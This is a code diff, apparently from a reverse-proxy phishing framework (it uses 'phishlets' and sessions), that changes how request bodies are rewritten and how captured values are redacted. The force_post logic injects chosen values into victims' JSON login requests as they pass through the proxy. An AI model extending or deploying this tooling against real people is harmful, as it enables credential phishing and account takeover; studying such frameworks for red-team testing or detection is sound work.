@@ -96,16 +96,10 @@ type ProxySession struct {
 }
 
 // set the value of the specified key in the JSON body
-func SetJSONVariable(body []byte, key string, value interface{}, tp string) ([]byte, error) {
+func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
 	var data map[string]interface{}
 	if err := json.Unmarshal(body, &data); err != nil {
 		return nil, err
-	}
-	switch tp {
-		case "boolean":
-			value,_ = strconv.ParseBool(value.(string))
-		default:
-			// nothing to do since the default is already 'string'
 	}
 	data[key] = value
 	newBody, err := json.Marshal(data)
@@ -116,13 +110,8 @@ func SetJSONVariable(body []byte, key string, value interface{}, tp string) ([]b
 }
 
 func redactString(s string) string {
-	// for input heslo123 returns h*****3
-	if len(s) < 5 {
-		return s
-	}
-
-	redacted := strings.Repeat("*", len(s)-2)
-	return string(s[0]) + redacted + string(s[len(s)-1])
+	// for input heslo123 returns *****
+	return strings.Repeat("*", 5)
 }
 
 func (p *HttpProxy) getPhishletBySession() *Phishlet {
@@ -765,42 +754,40 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 							// force post json
 							for _, fp := range pl.forcePost {
-								if fp.tp == "json" {
-									if fp.path.MatchString(req.URL.Path) {
-										log.Debug("force_post: url matched: %s", req.URL.Path)
-										ok_search := false
-										if len(fp.search) > 0 {
-											k_matched := len(fp.search)
-											for _, fp_s := range fp.search {
-												matches := fp_s.key.FindAllString(string(body), -1)
-												for _, match := range matches {
-													if fp_s.search.MatchString(match) {
-														if k_matched > 0 {
-															k_matched -= 1
-														}
-														log.Debug("force_post: [%d] matched - %s", k_matched, match)
-														break
+								if fp.path.MatchString(req.URL.Path) {
+									log.Debug("force_post: url matched: %s", req.URL.Path)
+									ok_search := false
+									if len(fp.search) > 0 {
+										k_matched := len(fp.search)
+										for _, fp_s := range fp.search {
+											matches := fp_s.key.FindAllString(string(body), -1)
+											for _, match := range matches {
+												if fp_s.search.MatchString(match) {
+													if k_matched > 0 {
+														k_matched -= 1
 													}
+													log.Debug("force_post: [%d] matched - %s", k_matched, match)
+													break
 												}
 											}
-											if k_matched == 0 {
-												ok_search = true
-											}
-										} else {
+										}
+										if k_matched == 0 {
 											ok_search = true
 										}
-										if ok_search {
-											for _, fp_f := range fp.force {
-												body, err = SetJSONVariable(body, fp_f.key, fp_f.value, fp_f.tp)
-												if err != nil {
-													log.Debug("force_post: got error: %s", err)
-												}
-												log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
-											}
-										}
-										req.ContentLength = int64(len(body))
-										log.Debug("force_post: body: %s len:%d", body, len(body))
+									} else {
+										ok_search = true
 									}
+									if ok_search {
+										for _, fp_f := range fp.force {
+											body, err = SetJSONVariable(body, fp_f.key, fp_f.value)
+											if err != nil {
+												log.Debug("force_post: got error: %s", err)
+											}
+											log.Debug("force_post: updated body parameter: %s : %s", fp_f.key, fp_f.value)
+										}
+									}
+									req.ContentLength = int64(len(body))
+									log.Debug("force_post: body: %s len:%d", body, len(body))
 								}
 							}
 
